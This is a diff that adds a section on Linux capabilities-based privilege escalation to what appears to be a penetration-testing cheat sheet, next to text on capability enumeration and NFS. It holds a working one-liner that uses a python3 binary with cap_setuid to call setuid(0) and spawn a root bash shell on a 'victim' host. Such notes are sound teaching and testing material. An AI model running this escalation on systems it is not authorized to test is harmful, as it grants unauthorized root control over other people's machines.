@@ -1252,6 +1252,20 @@ Enumerate capabilities in general with:
 getcap -r / 2>/dev/null
 ```
 
+### Capabilities Privilege Escalation
+
+{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" %}
+
+Example with python3:
+
+```text
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+```text
+username@victim:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
 ## NFS
 
 The NFS \(Network File System\) file system is a widely used distributed file system. The /etc/exports file is used to set up NFS shares. Remote users can access, create, and modify files, as well as mount shares. Even if they don't exist on the NFS server, new files inherit the remote user's and group's ids \(as owner and group, respectively\).
